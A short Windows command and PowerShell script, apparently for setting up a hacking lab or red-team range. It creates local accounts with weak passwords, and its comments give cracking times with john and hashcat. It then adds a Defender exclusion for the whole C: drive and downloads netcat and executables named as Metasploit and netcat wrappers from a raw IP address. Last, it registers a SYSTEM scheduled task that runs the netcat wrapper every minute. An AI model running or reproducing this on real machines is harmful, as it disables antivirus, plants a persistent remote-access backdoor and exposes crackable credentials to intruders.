net user julie Juliet /ADD #Takes a few seconds with "john --wordlist=/usr/share/john/password.lst --rules:All hash.txt" *OR*
#Takes about a minute with "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"
net user falcon ypmutS /ADD #Takes a few seconds with "john --wordlist=/usr/share/john/password.lst --rules:All hash.txt"
net user yvonne Any1 /ADD # Quick brute force, no mask necessary, or ?a?a?a?a, or ?u?l?l?d
net user madison hockey /ADD #Instant with "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"
net user callie Hacker! /ADD #A few minutes with hashcat -m 1000 -a 3 and mask ?u?l?l?l?l?l?a
Add-MpPreference -ExclusionPath "C:\";
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/nc.exe -OutFile C:/nc.exe;
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/defNotMal1cious.exe -OutFile C:/defNotMal1cious.exe;
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperMSF.exe -OutFile C:/windowsWrapperMSF.exe;
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperNC.exe -OutFile C:/windowsWrapperNC.exe;
$jobname = "windowsNC"
$script =  "c:\windowsWrapperNC.exe"
$repeat = (New-TimeSpan -Minutes 1)
$action = New-ScheduledTaskAction –Execute "$pshome\powershell.exe" -Argument  "$script; quit"
$duration = ([timeSpan]::maxvalue)
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval $repeat -RepetitionDuration $duration
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd
Register-ScheduledTask -TaskName $jobname -Action $action -Trigger $trigger -RunLevel Highest -User "System" -Settings $settings
